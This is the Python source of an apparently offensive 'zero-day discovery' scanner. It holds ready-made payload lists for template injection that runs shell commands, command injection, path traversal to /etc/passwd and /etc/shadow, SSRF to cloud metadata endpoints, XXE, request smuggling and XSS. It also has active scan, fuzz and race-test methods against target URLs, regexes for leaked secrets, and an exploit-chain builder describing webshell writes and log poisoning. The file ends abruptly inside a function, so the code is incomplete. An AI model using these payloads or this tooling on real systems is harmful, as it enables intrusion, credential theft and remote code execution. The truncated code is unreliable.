"""
HackBot Zero-Day Discovery Engine
===================================
Proactive vulnerability research engine that goes beyond known CVE scanning.

Capabilities:
  - Response anomaly detection (error leaks, stack traces, timing)
  - Smart fuzz payload generation (context-aware, multi-category)
  - Version gap analysis (find unpatched software between CVE ranges)
  - Exploit chain builder (combine low/medium findings into high-impact chains)
  - Service anomaly fingerprinting (detect non-standard behaviors)

Developed by Yashab Alam
"""

from __future__ import annotations

import logging
import re
from dataclasses import dataclass, field
from typing import Any, Dict, List, Optional

logger = logging.getLogger(__name__)


# ── Data Models ──────────────────────────────────────────────────────────────

@dataclass
class AnomalySignal:
    """A detected anomaly in a service response."""
    category: str          # error_leak, timing, stack_trace, path_disclosure, debug_info, memory_address
    severity: str          # Critical, High, Medium, Low, Info
    description: str
    evidence: str
    indicator: str         # What specific pattern was matched
    confidence: float      # 0.0 - 1.0
    exploit_potential: str  # Description of how this could be exploited

    def to_dict(self) -> Dict[str, Any]:
        return {
            "category": self.category,
            "severity": self.severity,
            "description": self.description,
            "evidence": self.evidence[:500],
            "indicator": self.indicator,
            "confidence": self.confidence,
            "exploit_potential": self.exploit_potential,
        }


@dataclass
class ExploitChain:
    """A proposed exploit chain combining multiple findings."""
    title: str
    chain_steps: List[Dict[str, str]]  # [{finding, technique, outcome}]
    overall_impact: str
    overall_severity: str
    likelihood: str   # High, Medium, Low
    prerequisites: List[str]
    mitigations: List[str]

    def to_dict(self) -> Dict[str, Any]:
        return {
            "title": self.title,
            "chain_steps": self.chain_steps,
            "overall_impact": self.overall_impact,
            "overall_severity": self.overall_severity,
            "likelihood": self.likelihood,
            "prerequisites": self.prerequisites,
            "mitigations": self.mitigations,
        }


@dataclass
class VersionGapResult:
    """A version gap analysis result for a service."""
    service: str
    detected_version: str
    nearest_vulnerable_versions: List[str]
    gap_type: str  # "between_cves", "after_last_cve", "exact_match_no_cve"
    risk_assessment: str
    recommendation: str

    def to_dict(self) -> Dict[str, Any]:
        return {
            "service": self.service,
            "detected_version": self.detected_version,
            "nearest_vulnerable_versions": self.nearest_vulnerable_versions,
            "gap_type": self.gap_type,
            "risk_assessment": self.risk_assessment,
            "recommendation": self.recommendation,
        }


@dataclass
class FuzzResult:
    """Result from a fuzz test."""
    payload: str
    category: str
    response_code: int = 0
    response_time: float = 0.0
    response_length: int = 0
    anomalies: List[AnomalySignal] = field(default_factory=list)
    interesting: bool = False
    notes: str = ""

    def to_dict(self) -> Dict[str, Any]:
        return {
            "payload": self.payload[:200],
            "category": self.category,
            "response_code": self.response_code,
            "response_time": self.response_time,
            "response_length": self.response_length,
            "anomalies": [a.to_dict() for a in self.anomalies],
            "interesting": self.interesting,
            "notes": self.notes,
        }


# ── Anomaly Detection Patterns ──────────────────────────────────────────────

ANOMALY_PATTERNS: Dict[str, Dict[str, Any]] = {
    "stack_trace": {
        "severity": "High",
        "confidence": 0.9,
        "patterns": [
            (r"Traceback \(most recent call last\)", "Python stack trace"),
            (r"at [\w.$]+\([\w.]+:\d+\)", "Java stack trace"),
            (r"#\d+ [\w/\\]+\.(?:php|inc)(?:\(\d+\))?:", "PHP stack trace"),
            (r"(?:Fatal error|Parse error|Warning):.*in .+ on line \d+", "PHP error with file path"),
            (r"Microsoft\.AspNetCore\.|System\.(?:Web|Net|IO)\.", ".NET stack trace"),
            (r"node_modules/|at Object\.<anonymous>|at Module\._compile", "Node.js stack trace"),
            (r"goroutine \d+ \[running\]:", "Go stack trace/panic"),
            (r"panic: runtime error:", "Go runtime panic"),
            (r"(?:Segmentation fault|SIGSEGV|SIGABRT)", "Native crash signal"),
        ],
    },
    "error_leak": {
        "severity": "Medium",
        "confidence": 0.8,
        "patterns": [
            (r"SQL (?:syntax|error|state).*(?:near|at)", "SQL error message leak"),
            (r"(?:mysql|mariadb|postgresql|sqlite|oracle|mssql).*error", "Database error leak"),
            (r"SQLSTATE\[[\w]+\]", "PDO/SQLSTATE error code"),
            (r"(?:ORA|PLS)-\d{4,5}:", "Oracle error code"),
            (r"Syntax error.*(?:unexpected|near|at line)", "Parser/syntax error leak"),
            (r"(?:undefined|is not defined|Cannot read propert)", "Runtime error leak"),
            (r"(?:Permission denied|Access denied|Forbidden).*(?:/[\w./]+)", "Permission error with path"),
            (r"(?:LDAP|SMTP|FTP).*(?:error|fail|invalid)", "Protocol error leak"),
        ],
    },
    "path_disclosure": {
        "severity": "Medium",
        "confidence": 0.85,
        "patterns": [
            (r"/(?:home|var|usr|opt|etc|srv|www|htdocs)/[\w./-]{5,}", "Unix path disclosure"),
            (r"[A-Z]:\\(?:Users|Windows|Program Files|inetpub|wwwroot)\\[\w.\\-]{5,}", "Windows path disclosure"),
            (r"(?:DocumentRoot|SCRIPT_FILENAME|DOCUMENT_ROOT)\s*[=:]\s*[\w/\\.-]+", "Web server path config leaked"),
            (r"/(?:WEB-INF|META-INF)/[\w./-]+", "Java webapp internal path"),
        ],
    },
    "debug_info": {
        "severity": "High",
        "confidence": 0.85,
        "patterns": [
            (r"(?:X-Debug-|X-Powered-By|X-AspNet-Version|X-Runtime)", "Debug headers exposed"),
            (r"(?:DEBUG|DEVELOPMENT|STAGING)\s*(?:=\s*(?:true|1|on|yes)|mode)", "Debug mode enabled"),
            (r"(?:phpinfo\(\)|pi\.php|info\.php|test\.php)", "PHP info page accessible"),
            (r"(?:django\.core|flask\.app|express|laravel).*(?:debug|stack)", "Framework debug mode"),
            (r"(?:Werkzeug|Django) Debugger", "Interactive debugger exposed"),
            (r"(?:DJANGO_SETTINGS_MODULE|FLASK_ENV|NODE_ENV).*(?:development|debug)", "Environment variable leak"),
        ],
    },
    "memory_address": {
        "severity": "Critical",
        "confidence": 0.7,
        "patterns": [
            (r"0x[0-9a-fA-F]{8,16}", "Memory address leak"),
            (r"at address 0x[0-9a-fA-F]+", "Crash with memory address"),
            (r"buffer overflow|heap overflow|stack overflow|use.after.free", "Memory corruption indicator"),
            (r"(?:ASAN|AddressSanitizer|MemorySanitizer):", "Sanitizer output leak"),
        ],
    },
    "auth_leak": {
        "severity": "Critical",
        "confidence": 0.75,
        "patterns": [
            (r"(?:api[_-]?key|apikey|secret[_-]?key|access[_-]?token)\s*[=:]\s*[\w.-]{10,}", "API key/secret exposed"),
            (r"(?:password|passwd|pwd)\s*[=:]\s*\S{4,}", "Password in response"),
            (r"(?:BEGIN (?:RSA |DSA |EC )?PRIVATE KEY)", "Private key exposed"),
            (r"(?:AWS|AKIA)[A-Z0-9]{12,}", "AWS credential leak"),
            (r"(?:eyJ[A-Za-z0-9_-]{10,}\.eyJ[A-Za-z0-9_-]{10,})", "JWT token in response"),
        ],
    },
    "injection_signal": {
        "severity": "High",
        "confidence": 0.7,
        "patterns": [
            (r"(?:You have an error in your SQL syntax|mysql_fetch|pg_query|sqlite3\.OperationalError)", "SQL injection confirmed"),
            (r"(?:command not found|sh: \d+:|/bin/(?:sh|bash):)", "Command injection signal"),
            (r"(?:root:[x*]:0:0:|daemon:[x*]:)", "/etc/passwd content leaked"),
            (r"(?:\[global\]|smb\.conf|\.htaccess|web\.config).*=", "Config file content leaked"),
            (r"(?:<!\[CDATA\[|<!ENTITY|SYSTEM\s+\"file://)", "XXE injection signal"),
        ],
    },
    "template_injection": {
        "severity": "High",
        "confidence": 0.85,
        "patterns": [
            (r"(?:TemplateSyntaxError|jinja2\.exceptions|Twig_Error|freemarker\.template|SmartyCompilerException)", "SSTI error disclosure"),
            (r"(?:org\.thymeleaf\.exceptions|VelocityException)", "Java template engine error"),
            (r"(?:django\.template\.exceptions|TemplateDoesNotExist)", "Django template engine error"),
            (r"\b49\b.*(?:7\*7|\{\{)", "Template expression evaluation reflected"),
        ],
    },
    "ssrf_cloud_metadata": {
        "severity": "Critical",
        "confidence": 0.9,
        "patterns": [
            (r"(?:ami-[a-z0-9]+|instance-id|security-credentials/|iam/security-credentials)", "AWS EC2 metadata disclosure"),
            (r"(?:computeMetadata/v1|metadata-flavor:\s*Google)", "GCP metadata disclosure"),
            (r"(?:169\.254\.169\.254|metadata\.google\.internal)", "Cloud metadata IP/host disclosure"),
            (r"(?:identity/oauth2/token|metadata/instance\?api-version)", "Azure instance metadata disclosure"),
        ],
    },
    "prototype_pollution": {
        "severity": "High",
        "confidence": 0.8,
        "patterns": [
            (r"(?:__proto__|constructor\.prototype)\s*(?:=|:)", "Prototype pollution vulnerability signal"),
            (r"Cannot assign to read only property.*prototype", "JavaScript prototype manipulation error"),
            (r"Object\.prototype pollution", "Prototype pollution reflection"),
        ],
    },
}


# ── Fuzz Payload Categories ──────────────────────────────────────────────────

FUZZ_PAYLOADS: Dict[str, List[str]] = {
    "buffer_overflow": [
        "A" * 256, "A" * 1024, "A" * 4096, "A" * 10000, "A" * 65536,
        "%s" * 100, "%n" * 50, "%x" * 100,
        "\x00" * 256, "\xff" * 256,
        "A" * 255 + "\x00", "A" * 1023 + "\x00",
        "{:>10000}".format("A"), "%" + "d" * 500,
    ],
    "integer_overflow": [
        "0", "-1", "-2147483648", "2147483647", "4294967295", "4294967296",
        "-2147483649", "9999999999999999999", "-9999999999999999999",
        "0x7FFFFFFF", "0x80000000", "0xFFFFFFFF", "0x100000000",
        "NaN", "Infinity", "-Infinity", "1e308", "-1e308", "1e-308",
        "99999999999999999999999999999999999999999999999999",
    ],
    "path_traversal": [
        "../../../etc/passwd", "....//....//....//etc/passwd",
        "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
        "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
        "..%252f..%252f..%252fetc%252fpasswd",
        "..%c0%af..%c0%af..%c0%afetc/passwd",
        "....//....//....//etc/shadow",
        "/etc/passwd%00.jpg", "/etc/passwd%00.png",
        "..%00/..%00/..%00/etc/passwd",
        "file:///etc/passwd", "file:///c:/windows/win.ini",
        "/proc/self/environ", "/proc/self/cmdline",
        "/var/log/apache2/access.log", "/var/log/auth.log",
    ],
    "template_injection": [
        "{{7*7}}", "${7*7}", "<%= 7*7 %>", "#{7*7}",
        "{{config}}", "{{self.__class__.__mro__}}",
        "${T(java.lang.Runtime).getRuntime().exec('id')}",
        "{{''.__class__.__mro__[2].__subclasses__()}}",
        "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "{{#with \"s\" as |string|}}{{#with \"e\"}}{{#with split as |conslist|}}{{this.pop}}{{/with}}{{/with}}{{/with}}",
        "@(1+1)", "@{1+1}", "*{1+1}",
        "{{constructor.constructor('return this')()}}", "${__import__('os').system('id')}",
    ],
    "ssrf": [
        "http://127.0.0.1", "http://localhost", "http://0.0.0.0",
        "http://[::1]", "http://0177.0.0.1", "http://2130706433",
        "http://169.254.169.254/latest/meta-data/",
        "http://metadata.google.internal/computeMetadata/v1/",
        "http://169.254.169.254/metadata/v1/",
        "http://100.100.100.200/latest/meta-data/",
        "http://169.254.169.254/openstack/latest/meta_data.json",
        "gopher://127.0.0.1:6379/_INFO",
        "dict://127.0.0.1:6379/INFO",
        "file:///etc/hosts", "http://127.1/",
        "http://0x7f000001/", "http://017700000001/",
    ],
    "deserialization": [
        'O:8:"stdClass":0:{}',  # PHP
        'a:1:{s:4:"test";s:4:"test";}',  # PHP array
        "rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcA==",  # Java (base64 stub)
        'gANjb3MKc3lzdGVt',  # Python pickle (base64 stub)
        '{"__proto__":{"polluted":true}}',  # JS prototype pollution
        '{"constructor":{"prototype":{"polluted":true}}}',
        "YToxOntzOjQ6InRlc3QiO3M6NDoiZXZpbCI7fQ==",  # PHP serialized b64
    ],
    "command_injection": [
        "; id", "| id", "|| id", "&& id", "& id",
        "`id`", "$(id)", "$((1+1))",
        "; cat /etc/passwd", "| cat /etc/passwd",
        "\n id", "\r\n id", "%0a id", "%0d%0a id",
        "'; id; '", '"; id; "',
        "a]]; id; echo [[", "a`; id; echo `",
        ";{id}", "|{id}", "$(sleep${IFS}5)",
        ";sleep${IFS}5", "|sleep${IFS}5",
        "a]|[$(id)]", "${IFS}id",
    ],
    "xss": [
        '<script>alert(1)</script>', '<img src=x onerror=alert(1)>',
        '<svg onload=alert(1)>', '"><svg onload=alert(1)//',
        "'-alert(1)-'", "javascript:alert(1)",
        '<details open ontoggle=alert(1)>', '<body onload=alert(1)>',
        '{{constructor.constructor("return this")()}}',
        '<iframe srcdoc="<script>alert(1)</script>">',
        "data:text/html,<script>alert(1)</script>",
        '<math><mtext><table><mglyph><style><!--</style><img src=x onerror=alert(1)//>',
    ],
    "header_injection": [
        "value\r\nInjected-Header: true",
        "value%0d%0aInjected-Header:%20true",
        "value\r\nSet-Cookie: evil=1",
        "value%0d%0aSet-Cookie:%20evil=1",
        "value\r\n\r\n<html>injected</html>",
        "value\r\nX-Forwarded-For: 127.0.0.1",
    ],
    "xxe": [
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://127.0.0.1:80/">]><root>&xxe;</root>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><root/>',
        '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><root>&xxe;</root>',
    ],
    "request_smuggling": [
        "GET / HTTP/1.1\r\nHost: target\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target\r\n\r\n",
        "POST / HTTP/1.1\r\nHost: target\r\nContent-Length: 6\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nG",
    ],
    "race_condition": [
        "RACE_TOKEN_PLACEHOLDER_{{UNIQUE_ID}}",
        "CONCURRENT_REQUEST_{{TIMESTAMP}}",
    ],
}


# ── Zero-Day Engine ──────────────────────────────────────────────────────────

class ZeroDayEngine:
    """
    Proactive zero-day vulnerability discovery engine.

    Goes beyond known-CVE scanning with intelligent fuzzing,
    anomaly detection, version gap analysis, exploit chaining,
    and active scanning with HTTP client integration.
    """

    def __init__(self) -> None:
        self._anomaly_cache: Dict[str, List[AnomalySignal]] = {}
        self._active_engine: Optional[Any] = None

    # ── Active Engine Integration ────────────────────────────────────

    @property
    def active_engine(self) -> Any:
        """Lazy-load the ActiveScanLoop for active attack capabilities."""
        if self._active_engine is None:
            try:
                from hackbot.core.zeroday_active import ActiveScanLoop
                self._active_engine = ActiveScanLoop()
            except ImportError:
                logger.warning("Active scan engine not available")
        return self._active_engine

    def run_active_scan(
        self,
        target_url: str,
        config: Optional[Dict[str, Any]] = None,
        on_finding: Optional[Any] = None,
        on_status: Optional[Any] = None,
    ) -> Dict[str, Any]:
        """Run a full active scan loop against a target URL.

        Args:
            target_url: The base URL to scan
            config: Optional ScanConfig overrides as dict
            on_finding: Callback for each finding
            on_status: Callback for status updates

        Returns:
            Complete scan report dict
        """
        from hackbot.core.zeroday_active import ActiveScanLoop, ScanConfig

        scan_config = ScanConfig()
        if config:
            for key, val in config.items():
                if hasattr(scan_config, key):
                    setattr(scan_config, key, val)

        loop = ActiveScanLoop(config=scan_config, on_finding=on_finding, on_status=on_status)
        return loop.run(target_url)

    def fuzz_endpoint(
        self,
        url: str,
        parameter: str,
        categories: Optional[List[str]] = None,
        method: str = "GET",
    ) -> Dict[str, Any]:
        """Fuzz a specific endpoint parameter with stateful session management.

        Returns:
            FuzzSession results as dict
        """
        from hackbot.core.zeroday_active import HttpClient, StatefulFuzzer

        client = HttpClient()
        fuzzer = StatefulFuzzer(client, self)
        session = fuzzer.fuzz_parameter(url, parameter, categories, method)
        return session.to_dict()

    def race_test(
        self,
        url: str,
        method: str = "POST",
        data: Optional[Dict[str, str]] = None,
        count: int = 20,
    ) -> Dict[str, Any]:
        """Send concurrent requests to test for race conditions.

        Returns:
            Race test results with analysis
        """
        from hackbot.core.zeroday_active import HttpClient, ParallelExecutor

        client = HttpClient()
        executor = ParallelExecutor(client)
        return executor.race_test(url, method, data, count)

    def map_target(self, target_url: str) -> Dict[str, Any]:
        """Crawl and map a target's attack surface.

        Returns:
            Endpoint map with scored targets
        """
        from hackbot.core.zeroday_active import HttpClient, TargetMapper

        client = HttpClient()
        mapper = TargetMapper(client)
        endpoints = mapper.crawl(target_url)
        return {
            "endpoints": {k: v.to_dict() for k, v in endpoints.items()},
            "tech_stack": list(mapper.tech_stack),
            "total": len(endpoints),
            "prioritized": [e.to_dict() for e in mapper.get_prioritized()[:20]],
        }

    # ── Response Anomaly Detection ───────────────────────────────────

    def analyze_response(
        self,
        response_body: str,
        response_headers: str = "",
        response_code: int = 200,
        response_time: float = 0.0,
        baseline_time: float = 0.0,
    ) -> List[AnomalySignal]:
        """
        Analyze an HTTP response for anomaly signals that indicate
        exploitable conditions.

        Args:
            response_body: The response body text
            response_headers: Response headers as string
            response_code: HTTP status code
            response_time: Time taken for this response (seconds)
            baseline_time: Average response time for normal requests

        Returns:
            List of detected anomaly signals
        """
        anomalies: List[AnomalySignal] = []
        full_text = f"{response_headers}\n{response_body}"

        # Pattern-based detection
        for category, config in ANOMALY_PATTERNS.items():
            base_severity = config["severity"]
            base_confidence = config["confidence"]

            for pattern_str, indicator in config["patterns"]:
                try:
                    matches = re.findall(pattern_str, full_text, re.IGNORECASE)
                except re.error:
                    continue

                if matches:
                    evidence = matches[0] if isinstance(matches[0], str) else str(matches[0])
                    anomalies.append(AnomalySignal(
                        category=category,
                        severity=base_severity,
                        description=f"Detected {indicator} in response",
                        evidence=evidence[:300],
                        indicator=indicator,
                        confidence=base_confidence,
                        exploit_potential=self._assess_exploit_potential(category, indicator),
                    ))

        # Timing anomaly detection
        if baseline_time > 0 and response_time > 0:
            ratio = response_time / baseline_time
            if ratio > 3.0:
                anomalies.append(AnomalySignal(
                    category="timing",
                    severity="High" if ratio > 10 else "Medium",
                    description=f"Response time anomaly: {response_time:.2f}s vs baseline {baseline_time:.2f}s ({ratio:.1f}x slower)",
                    evidence=f"response_time={response_time:.3f}s, baseline={baseline_time:.3f}s",
                    indicator="Timing-based blind injection candidate",
                    confidence=min(0.6 + (ratio - 3) * 0.05, 0.95),
                    exploit_potential="Potential blind injection — timing difference suggests backend processing of injected input. Try time-based payloads.",
                ))

        # Status code anomalies
        if response_code == 500:
            anomalies.append(AnomalySignal(
                category="error_leak",
                severity="Medium",
                description="Internal server error (500) — potential unhandled exception",
                evidence=f"HTTP {response_code}",
                indicator="Server error response",
                confidence=0.7,
                exploit_potential="Server returned 500. Input may have reached backend logic and caused an exception — indicates potential injection point.",
            ))
        elif response_code == 502 or response_code == 503:
            anomalies.append(AnomalySignal(
                category="error_leak",
                severity="Medium",
                description=f"Backend error ({response_code}) — potential service disruption from input",
                evidence=f"HTTP {response_code}",
                indicator="Backend service error",
                confidence=0.6,
                exploit_potential="Backend service issue. Input may have crashed or overloaded a backend service — potential DoS or overflow vulnerability.",
            ))

        # Response length anomaly (only if body seems unusually large/small for error)
        if response_code >= 400 and len(response_body) > 5000:
            anomalies.append(AnomalySignal(
                category="debug_info",
                severity="Low",
                description=f"Verbose error response ({len(response_body)} bytes) — potential information disclosure",
                evidence=f"Response length: {len(response_body)} bytes for HTTP {response_code}",
                indicator="Verbose error page",
                confidence=0.5,
                exploit_potential="Unusually verbose error page may leak internal architecture, paths, or debug information.",
            ))

        return anomalies

    def _assess_exploit_potential(self, category: str, indicator: str) -> str:
        """Assess the exploitation potential of a detected anomaly."""
        potentials = {
            "stack_trace": "Stack trace reveals internal code structure, file paths, library versions. Use for targeted exploitation of identified components.",
            "error_leak": "Error messages reveal backend technology and query structure. Craft targeted injection payloads based on the error context.",
            "path_disclosure": "Disclosed paths reveal server structure. Use for targeted file inclusion, path traversal, or identifying writable directories.",
            "debug_info": "Debug mode often disables security controls, reveals secrets, and enables interactive code execution (e.g., Werkzeug debugger RCE).",
            "memory_address": "Memory address leaks defeat ASLR. Combined with a memory corruption bug, this enables reliable exploitation.",
            "auth_leak": "Leaked credentials/keys provide direct access. Test extracted credentials against all discovered services and APIs.",
            "injection_signal": "Confirmed injection point. Escalate with targeted payloads: extract data, execute commands, or pivot to internal services.",
            "template_injection": "Server-Side Template Injection (SSTI) allows execution of template syntax in backend engines, often escalating to remote code execution (RCE).",
            "ssrf_cloud_metadata": "Disclosed cloud instance metadata allows exfiltration of IAM credentials, STS temporary tokens, or service account secrets, enabling cloud environment compromise.",
            "prototype_pollution": "Prototype pollution enables tampering with JavaScript Object prototypes, potentially leading to property injection, authorization bypass, or remote code execution.",
        }
        return potentials.get(category, f"Anomaly detected ({indicator}). Investigate for exploitable condition.")

    # ── Smart Fuzz Payload Generation ────────────────────────────────

    def get_fuzz_payloads(
        self,
        category: str = "",
        context: str = "",
        max_payloads: int = 50,
    ) -> List[str]:
        """
        Get fuzz payloads, optionally filtered by category and context.

        Args:
            category: Payload category (e.g., 'xss', 'sqli', 'command_injection').
                      Empty = all categories.
            context: Context hint (e.g., 'json_param', 'url_path', 'header', 'xml_body')
            max_payloads: Maximum payloads to return

        Returns:
            List of fuzz payload strings
        """
        if category and category in FUZZ_PAYLOADS:
            payloads = list(FUZZ_PAYLOADS[category])
        elif category:
            # Fuzzy match
            for key in FUZZ_PAYLOADS:
                if category.lower() in key.lower() or key.lower() in category.lower():
                    payloads = list(FUZZ_PAYLOADS[key])
                    break
            else:
                # Return all
                payloads = []
                for v in FUZZ_PAYLOADS.values():
                    payloads.extend(v)
        else:
            payloads = []
            for v in FUZZ_PAYLOADS.values():
                payloads.extend(v)

        # Context-aware filtering
        if context == "json_param":
            # Favor injection and deserialization payloads
            priority_cats = ["command_injection", "template_injection", "deserialization", "xss"]
            payloads = self._prioritize_by_category(priority_cats, max_payloads)
        elif context == "url_path":
            priority_cats = ["path_traversal", "command_injection", "ssrf"]
            payloads = self._prioritize_by_category(priority_cats, max_payloads)
        elif context == "header":
            priority_cats = ["header_injection", "ssrf", "command_injection"]
            payloads = self._prioritize_by_category(priority_cats, max_payloads)
        elif context == "xml_body":
            priority_cats = ["xxe", "command_injection", "buffer_overflow"]
            payloads = self._prioritize_by_category(priority_cats, max_payloads)

        return payloads[:max_payloads]

    def _prioritize_by_category(self, priority_cats: List[str], max_total: int) -> List[str]:
        """Return payloads prioritized by category order."""
        result: List[str] = []
        per_cat = max(max_total // max(len(priority_cats), 1), 5)
        for cat in priority_cats:
            if cat in FUZZ_PAYLOADS:
                result.extend(FUZZ_PAYLOADS[cat][:per_cat])
        # Fill remaining from other categories
        remaining = max_total - len(result)
        if remaining > 0:
            for cat, payloads in FUZZ_PAYLOADS.items():
                if cat not in priority_cats:
                    result.extend(payloads[:max(remaining // 4, 3)])
        return result

    def get_payload_categories(self) -> List[Dict[str, Any]]:
        """List all available fuzz payload categories with counts."""
        return [
            {
                "name": name,
                "count": len(payloads),
                "description": self._category_description(name),
            }
            for name, payloads in FUZZ_PAYLOADS.items()
        ]

    @staticmethod
    def _category_description(name: str) -> str:
        descriptions = {
            "buffer_overflow": "Buffer overflow / format string payloads for memory corruption testing",
            "integer_overflow": "Integer boundary values and overflow conditions",
            "path_traversal": "Directory traversal with encoding bypasses and null bytes",
            "template_injection": "Server-side template injection (SSTI) for Jinja2, Freemarker, Twig, etc.",
            "ssrf": "Server-side request forgery targeting internal services and cloud metadata",
            "deserialization": "Insecure deserialization payloads for Java, PHP, Python, Node.js",
            "command_injection": "OS command injection with various shell escape techniques",
            "xss": "Cross-site scripting with filter bypass techniques",
            "header_injection": "HTTP header injection / CRLF injection payloads",
            "xxe": "XML External Entity injection payloads",
            "request_smuggling": "HTTP request smuggling (CL.TE, TE.CL) payloads",
            "race_condition": "Race condition test markers for concurrent request testing",
        }
        return descriptions.get(name, f"Fuzz payloads for {name} testing")

    # ── Version Gap Analysis ────────────────────────────────────────

    def analyze_version_gap(
        self,
        service: str,
        version: str,
        known_cves: List[Dict[str, Any]],
    ) -> Optional[VersionGapResult]:
        """
        Analyze whether a service version falls in a 'gap' between known CVEs,
        suggesting it may have undisclosed vulnerabilities.

        Args:
            service: Service name (e.g., "Apache httpd")
            version: Detected version (e.g., "2.4.51")
            known_cves: List of CVE dicts with 'cve_id', 'affected_versions', 'cvss_score'
        """
        if not version or not known_cves:
            return None

        vulnerable_versions = set()
        for cve in known_cves:
            for v in cve.get("affected_versions", []):
                vulnerable_versions.add(str(v))

        # Check if exact version has known CVEs
        if version in vulnerable_versions:
            return None  # Already has known CVEs, not a gap

        # Sort versions for gap analysis
        nearby = sorted(vulnerable_versions)

        if not nearby:
            return VersionGapResult(
                service=service,
                detected_version=version,
                nearest_vulnerable_versions=[],
                gap_type="no_cve_data",
                risk_assessment="Insufficient CVE data for gap analysis",
                recommendation=f"Manual security testing recommended for {service} {version}",
            )

        return VersionGapResult(
            service=service,
            detected_version=version,
            nearest_vulnerable_versions=nearby[:5],
            gap_type="between_cves",
            risk_assessment=(
                f"{service} {version} has no known CVEs but nearby versions do. "
                f"This could mean: (a) the version is patched, (b) vulnerabilities "
                f"exist but haven't been disclosed, or (c) the version was not widely tested."
            ),
            recommendation=(
                f"Deep-test {service} {version} with targeted fuzzing. "
                f"Focus on vulnerability classes found in nearby versions. "
                f"Check changelogs between versions for security-relevant patches."
            ),
        )

    # ── Exploit Chain Builder ───────────────────────────────────────

    def build_exploit_chains(
        self,
        findings: List[Dict[str, Any]],
    ) -> List[ExploitChain]:
        """
        Analyze findings to propose exploit chains that combine
        multiple low/medium findings into high-impact attack paths.
        """
        chains: List[ExploitChain] = []

        findings_by_type = self._categorize_findings(findings)

        # Chain: SSRF + Internal Service = Data Exfiltration/RCE
        if findings_by_type.get("ssrf") and findings_by_type.get("internal_service"):
            chains.append(ExploitChain(
                title="SSRF → Internal Service Access → Data Exfiltration/RCE",
                chain_steps=[
                    {"finding": "SSRF vulnerability", "technique": "Craft SSRF payload to reach internal service", "outcome": "Access to internal network service"},
                    {"finding": "Internal service exposed", "technique": "Interact with internal service through SSRF", "outcome": "Data exfiltration or command execution on internal host"},
                ],
                overall_impact="Full internal network access through web application SSRF. Can lead to data breach or remote code execution on internal systems.",
                overall_severity="Critical",
                likelihood="High",
                prerequisites=["SSRF allows arbitrary URL requests", "Internal services accessible from web server"],
                mitigations=["Implement URL allowlisting", "Network segmentation", "Disable unnecessary internal services"],
            ))

        # Chain: SQLi + File Write = RCE
        if findings_by_type.get("sqli") and findings_by_type.get("file_write"):
            chains.append(ExploitChain(
                title="SQL Injection → File Write → Remote Code Execution",
                chain_steps=[
                    {"finding": "SQL injection", "technique": "Use INTO OUTFILE or COPY TO to write files", "outcome": "Write webshell to document root"},
                    {"finding": "File write capability", "technique": "Write PHP/JSP webshell via SQL", "outcome": "Remote code execution as web server user"},
                ],
                overall_impact="Remote code execution through SQL injection file write. Full server compromise.",
                overall_severity="Critical",
                likelihood="Medium",
                prerequisites=["Database user has FILE privilege", "Known web root path", "Writable web directory"],
                mitigations=["Revoke FILE privilege from database user", "Parameterized queries", "Read-only web root"],
            ))

        # Chain: LFI + Log Poisoning = RCE
        if findings_by_type.get("lfi") and findings_by_type.get("log_access"):
            chains.append(ExploitChain(
                title="Local File Inclusion → Log Poisoning → RCE",
                chain_steps=[
                    {"finding": "Local File Inclusion", "technique": "Poison access/error log with PHP code via User-Agent", "outcome": "Malicious code stored in log file"},
                    {"finding": "Log file accessible via LFI", "technique": "Include poisoned log file through LFI", "outcome": "PHP code executes — RCE achieved"},
                ],
                overall_impact="Remote code execution through log poisoning. No file upload needed.",
                overall_severity="Critical",
                likelihood="High",
                prerequisites=["LFI vulnerability exists", "Log files readable by web server", "PHP (or similar) execution"],
                mitigations=["Fix LFI vulnerability", "Restrict log file permissions", "Disable dynamic includes"],
            ))

        # Chain: XSS + CSRF + Admin = Account Takeover
        if findings_by_type.get("xss") and findings_by_type.get("csrf"):
            chains.append(ExploitChain(
                title="Stored XSS → CSRF → Admin Account Takeover",
                chain_steps=[
                    {"finding": "Stored XSS", "technique": "Inject JavaScript that forges admin requests", "outcome": "CSRF payload executes in admin context"},
                    {"finding": "Missing CSRF protection", "technique": "Change admin password or create new admin via XSS-driven CSRF", "outcome": "Full admin account takeover"},
                ],
                overall_impact="Complete application takeover through chained XSS and CSRF.",
                overall_severity="Critical",
                likelihood="Medium",
                prerequisites=["Stored XSS in pages viewable by admin", "No CSRF tokens on sensitive actions"],
                mitigations=["Input sanitization", "CSRF tokens", "Content Security Policy", "HttpOnly cookies"],
            ))

        # Chain: Info Disclosure + Credential Stuffing
        if findings_by_type.get("info_disclosure") and findings_by_type.get("auth_weakness"):
            chains.append(ExploitChain(
                title="Information Disclosure → Credential Attack → Unauthorized Access",
                chain_steps=[
                    {"finding": "Information disclosure", "technique": "Extract usernames, email addresses, or technology stack details", "outcome": "Valid username enumeration"},
                    {"finding": "Authentication weakness", "technique": "Brute-force or credential-stuff discovered accounts", "outcome": "Unauthorized access to user/admin accounts"},
                ],
                overall_impact="Account compromise through combined information leakage and weak authentication.",
                overall_severity="High",
                likelihood="Medium",
                prerequisites=["User enumeration possible", "No account lockout or rate limiting"],
                mitigations=["Rate limiting", "Account lockout", "MFA", "Generic error messages"],
            ))

        # Chain: Open Redirect + Phishing
        if findings_by_type.get("open_redirect"):
            chains.append(ExploitChain(
                title="Open Redirect → Credential Phishing",
                chain_steps=[
                    {"finding": "Open redirect", "technique": "Craft legitimate-looking URL that redirects to phishing page", "outcome": "User trusts the domain and enters credentials on attacker page"},
                ],
                overall_impact="Credential theft through trusted domain abuse.",
                overall_severity="High",
                likelihood="High",
                prerequisites=["Open redirect vulnerability", "Attacker-controlled phishing page"],
                mitigations=["Whitelist redirect destinations", "Warn users on external redirects"],
            ))

